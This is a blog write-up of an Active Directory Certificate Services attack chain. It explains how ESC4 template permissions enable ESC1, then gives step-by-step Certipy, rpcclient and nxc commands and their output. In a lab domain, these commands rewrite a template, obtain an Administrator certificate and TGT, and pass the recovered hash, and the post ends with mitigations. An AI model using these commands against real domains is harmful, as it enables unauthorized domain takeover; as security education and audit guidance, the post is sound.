---
layout: post
title: "From ESC4 to Domain Admin: exploiting vulnerable templates in AD CS"
date: 2026-08-14
categories: [writeup, active-directory]
lang: en
ref: adcs-esc1
permalink: /en/posts/adcs-esc1
excerpt: "Active Directory Certificate Services (AD CS) is one of the most powerful technologies, and when misconfigured, one of the most dangerous within an AD environment. In this article, I will cover a scenario I came across during my AD studies, involving an exploitation chain involving ESC4 -> ESC1."
---

# {{ page.title }}

<div style="font-family: monospace; font-size: 0.9em; opacity: 0.7; margin: 0.8rem 0 1.5rem 0;">
  <span>[active directory]</span> &bull; 
  <span>[writeup]</span> 
</div>

---

### **$ cat summary.txt**
* TOC
{:toc}

---

Active Directory Certificate Services (AD CS) is one of the most powerful technologies, and when misconfigured, one of the most dangerous within an AD environment. In this article, I will cover a scenario I came across during my AD studies, involving an exploitation chain involving ESC4 -> ESC1.

---

## 01. What is AD CS?

**Active Directory Certificate Services (AD CS)** is Microsoft's PKI (*Public Key Infrastructure*) service integrated with Active Directory. It allows an organization to operate its own internal Certificate Authority (CA), issuing digital certificates for users, computers, and services.

One of the most relevant uses of AD CS, and also one of the most dangerous when an insecure configuration exists, is certificate-based authentication.

In Active Directory, certain certificates can be used during Kerberos authentication through **PKINIT (Public Key Cryptography for Initial Authentication)**. Instead of proving their identity directly using a password, the user can present a valid certificate associated with their account.

This means that, if an attacker manages to obtain a valid certificate that is accepted by the domain as belonging to another user, they will be able to authenticate as that identity without ever needing to know their password.

Certificates are issued based on **Certificate Templates**, which define, among other things:

- Who can request a certificate using that template;
- Which EKUs (*Extended Key Usages*) will be present in the certificate, including usages that allow authentication, such as **Client Authentication** and **Smart Card Logon**;
- Whether the requester can provide identity information in the certificate, such as the **Subject Alternative Name (SAN)**;
- Whether issuance requires manual approval;
- Whether authorized signatures are required;
- Who has administrative permissions over the template object in Active Directory.

<br>

In 2021, SpecterOps published the **Certified Pre-Owned** research, which cataloged a series of insecure AD CS configurations. These techniques became known as **ESC1, ESC2, ESC3, ESC4**, and so on.

In this article, the focus will mainly be on an exploitation chain involving **ESC4 → ESC1**.

The link to the original SpecterOps research is listed in the references.

---

## 02. What is ESC1?

**ESC1** occurs when a Certificate Template allows a low-privileged user to obtain a certificate that can be used to authenticate as another identity.

Simply put, a typical ESC1 configuration presents the following conditions:

- The template allows the requester to provide identity information in the certificate, usually through the `ENROLLEE_SUPPLIES_SUBJECT` flag;
- The template includes an EKU compatible with authentication, such as `Client Authentication`, `Smart Card Logon`, `PKINIT Client Authentication`, or equivalent;
- The template does not require manual approval from a Certificate Manager;
- The template does not require additional authorized signatures;
- Low-privileged users have permission to request certificates using that template.

<br>

When these conditions coexist, a user with enrollment permission can request a certificate specifying a privileged identity in the SAN, such as a Domain Admin.

Because the template was configured to accept this information provided by the requester, the CA can issue the certificate containing the specified identity.

If the certificate can be correctly mapped to the target account by the KDC, it can then be used for Kerberos authentication via PKINIT.

In a vulnerable scenario, this can result in authentication as a privileged account without its password being known.

---

## 03. Is it possible to turn a template into ESC1?

Yes! And one of the scenarios that allows this is **ESC4**.

Unlike ESC1, ESC4 is not about the configuration of the certificate itself, but rather about **who can change the template configuration**.

Certificate Templates are objects stored in AD and, like other directory objects, have an ACL (*Access Control List*).

If a low-privileged user or group has dangerous rights over the template, such as:

- `GenericAll`;
- `WriteDacl`;
- `WriteOwner`;
- `WriteProperty` over relevant attributes;

<br>

that user or group may be able to change the template properties.

This allows, for example:

- Enabling `ENROLLEE_SUPPLIES_SUBJECT`;
- Adding EKUs compatible with authentication;
- Removing the Certificate Manager approval requirement;
- Changing signature requirements;
- Modifying enrollment permissions;
- Changing the template's own ACL, depending on the available rights.

<br>

Thus, even if the template is not originally vulnerable to ESC1, an attacker with sufficient control over it can modify its configuration and introduce the conditions required to exploit it in this way.

It is important to note, however, that controlling the template object does not automatically mean that a CA will issue certificates through it. For the chain to be directly exploitable, the template must be published by an Enterprise CA accessible to the attacker.

---

## 04. ESC4 → ESC1 exploitation chain

```text
Low-privileged user authenticated to the domain
            |
            v
   Enumerates AD CS templates
            |
            v
       Identifies an ESC4
            |
            v
Modifies the vulnerable template
            |
            v
      Introduces ESC1
            |
            v
 Requests a certificate as Administrator
            |
            v
         PKINIT
            |
            v
     Domain compromised.
```

---

## 05. Exploitation

One of the most widely used tools for offensive AD CS enumeration and exploitation is **Certipy**.

In this example, it will be used from a Linux machine. The same type of attack can also be carried out in Windows environments using tools such as **Certify** and **Rubeus**.

### Reconnaissance

The first step is to map the Certificate Templates and look for vulnerable conditions.

```bash
certipy find \
  -u 'user@ad.local' \
  -p '<redacted>' \
  -dc-ip <domain-controller-ip> \
  -vulnerable \
  -stdout
```

<br>

Example output:

```text
...
[+] User Enrollable Principals      : AD.LOCAL\Domain Users
[+] User ACL Principals             : AD.LOCAL\Authenticated Users
[!] Vulnerabilities
      ESC4                          : User has dangerous permissions.
```

<br>

Certipy automatically identifies several configurations related to ESC1, ESC4, and other AD CS abuse techniques.

In this example, the result indicates that `VulnTemplate` is susceptible to ESC4 because a low-privileged principal has dangerous permissions over the template object.

It is recommended to confirm exactly which rights were granted.

This can be done by analyzing the complete Certipy output or using tools such as Impacket's `dacledit.py`.

The most relevant rights include, for example:

- `GenericAll`;
- `WriteOwner`;
- `WriteDacl`;
- `WriteProperty`.

---

### Exploiting ESC4

With Certipy, it is possible to automatically change the configuration of the vulnerable template.

```bash
certipy-ad template \
  -u 'user@ad.local' \
  -p '<redacted>' \
  -dc-ip <domain-controller-ip> \
  -template 'VulnTemplate' \
  -write-default-configuration
```

<br>

Output:

```text
Certipy v5.1.0 - by Oliver Lyak (ly4k)

Are you sure you want to apply these changes to 'VulnTemplate'? (y/N): y
[*] Successfully updated 'VulnTemplate'
```

<br>

The default configuration applied by Certipy turns the template into an exploitable configuration, modifying attributes and permissions required to allow arbitrary certificate requests.

Depending on the tool version, this process may involve changes such as:

- Enabling `ENROLLEE_SUPPLIES_SUBJECT`;
- Adding authentication EKUs;
- Removing approval requirements;
- Changing permissions related to enrollment.

<br>

**Important:** during a pentest, always preserve the original template configuration so it can be restored afterward.

---

## 06. Obtaining the target SID

After the changes introduced by Microsoft to certificate mapping in Active Directory, modern environments began using stricter mechanisms to associate a certificate with a domain account.

For this reason, in a modern ESC1 scenario, it is not recommended to rely solely on the UPN present in the SAN.

When requesting the certificate with Certipy, we can also provide the **SID of the target account**, allowing the information required for identity mapping to be included in the certificate.

In this example, we want to compromise the `Administrator` account.

First, we can obtain the domain SID using `rpcclient`:

```bash
rpcclient -U 'user%<redacted>' 192.168.116.130 -c 'lsaquery'
```

<br>

Output:

```text
Domain Name: AD
Domain Sid: S-1-5-21-2051240905-3916223753-3320999350
```

<br>

The SID returned above corresponds to the domain, and not directly to the `Administrator` account.

Domain user SIDs follow this structure:

```text
S-1-5-21-<domain-sid>-<RID>
```

In the case of the **default domain Administrator account**, the RID is `500`.

Therefore, knowing the Domain SID, we can derive the complete SID of this account:

```text
S-1-5-21-2051240905-3916223753-3320999350-500
```

<br>

It is important to note that the built-in Administrator account can be renamed. The relevant element here is its RID `500`, not necessarily the account's current name.

There are also other ways to directly obtain the SID of the target account, including LDAP, BloodHound, PowerShell, and Active Directory enumeration tools.

Whenever possible, directly querying the SID of the desired identity is preferable to relying on assumptions.

---

## 07. Applying ESC1

With the template already modified and the target account SID identified, we can request a certificate representing the Administrator.

```bash
certipy-ad req \
  -u 'user@ad.local' \
  -p '<redacted>' \
  -dc-ip 192.168.116.130 \
  -ca 'ad-DC01-CA' \
  -template 'VulnTemplate' \
  -upn 'administrator@ad.local' \
  -sid 'S-1-5-21-2051240905-3916223753-3320999350-500'
```

<br>

Output:

```text
[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@ad.local'
[*] Certificate object SID is 'S-1-5-21-2051240905-3916223753-3320999350-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

<br>

The CA issues the certificate because, from its point of view, the template is configured to accept that request.

Certipy saves the certificate and its private key locally in a `.pfx` file.

---

## 08. Authenticating with the certificate

With the `.pfx` file, we can attempt Kerberos authentication via PKINIT as the identity represented in the certificate.

```bash
certipy auth \
  -pfx administrator.pfx \
  -dc-ip <domain-controller-ip>
```

<br>

Output:

```text
[*] Certificate identities:
[*]     SAN UPN: 'administrator@ad.local'
[*]     SAN URL SID: 'S-1-5-21-2051240905-3916223753-3320999350-500'
[*]     Security Extension SID: 'S-1-5-21-2051240905-3916223753-3320999350-500'
[*] Using principal: 'administrator@ad.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@ad.local': aad3b435b51404eeaad<redacted>:48cc66acfe<redacted>
```

<br>

Certipy obtains a **TGT (Ticket Granting Ticket)** for the account and saves the ticket in a `.ccache` file.

Under certain conditions, the tool can also recover the account's NT hash through the technique known as **UnPAC-the-hash**.

With the obtained hash, we can validate access:

```bash
nxc smb 192.168.116.130 \
  -u administrator \
  -H '48cc66acfe<redacted>'
```

<br>

Output:

```text
SMB  192.168.116.130 445 WIN-O7IB1M8TPEM [*] Windows 11 / Server 2025 Build 26100 x64
SMB  192.168.116.130 445 WIN-O7IB1M8TPEM [+] ad.local\administrator:48cc66acfe<redacted> (Pwn3d!)
```

<br>

From this point onward, we have access to the Administrator account, resulting in the complete compromise of the domain.

---

## 09. Impact

This chain can result in the complete compromise of the domain from a low-privileged account.

In a vulnerable scenario, the attacker can reach a privileged identity without the need for:

- Prior lateral movement;
- Initial administrative privileges;
- Interaction with other users during exploitation;
- Knowledge of the privileged account's password.

<br>

However, this does not mean that **any** authenticated account in the domain will necessarily be able to exploit ESC4.

The account used as the starting point needs to have, directly or indirectly, the necessary rights over the vulnerable object or belong to a group that has those permissions.

Accounts compromised through phishing, credential stuffing, password spraying, or service credentials can become entry points for this chain if they have access to the vulnerable permissions.

---

## 10. Prevention is better than cure...

The main measure against ESC4 is to review the existing ACLs on all Certificate Templates.

Broad, low-privileged groups such as `Authenticated Users` and `Domain Users` should generally not have control rights over templates, such as:

- `GenericAll`;
- `WriteDacl`;
- `WriteOwner`;
- `WriteProperty` over sensitive attributes.

<br>

If delegated administrative permissions exist, they should be justified and limited to the smallest possible set of users.

It is also important to:

- Disable `ENROLLEE_SUPPLIES_SUBJECT` when the functionality is not required;
- Restrict authentication EKUs only to templates that actually need them;
- Review which groups have enrollment permission;
- Periodically audit templates published by Enterprise CAs;
- Keep Domain Controllers and AD CS servers up to date;
- Ensure that modern strong certificate mapping mechanisms are enabled;
- Monitor changes to Certificate Template objects;
- Monitor abnormal certificate requests involving privileged identities.

---

## 11. Conclusion

AD CS adds a powerful layer of authentication and identity management to Active Directory, but this same integration can turn seemingly simple permission errors into critical **privilege escalation** paths.

ESC4 is a good example of this.

An insecure ACL on a Certificate Template can allow a low-privileged user to completely change its behavior and introduce an ESC1-compatible configuration.

From there, the attacker can request a certificate representing a privileged identity and use PKINIT to authenticate as that account.

For this reason, Active Directory environments should treat Certificate Templates as highly sensitive objects, applying strict access control, continuous auditing, and monitoring of changes made to AD CS.

---

## 12. References

- SpecterOps — Certified Pre-Owned: https://specterops.io/blog/2021/06/17/certified-pre-owned/
- Certipy: https://github.com/ly4k/Certipy
- Certipy Wiki — Privilege Escalation: https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
- Microsoft — Active Directory Certificate Services: https://learn.microsoft.com/pt-br/windows-server/identity/ad-cs/
- Microsoft — KB5014754: Certificate-based authentication changes on Windows domain controllers: https://support.microsoft.com/help/5014754
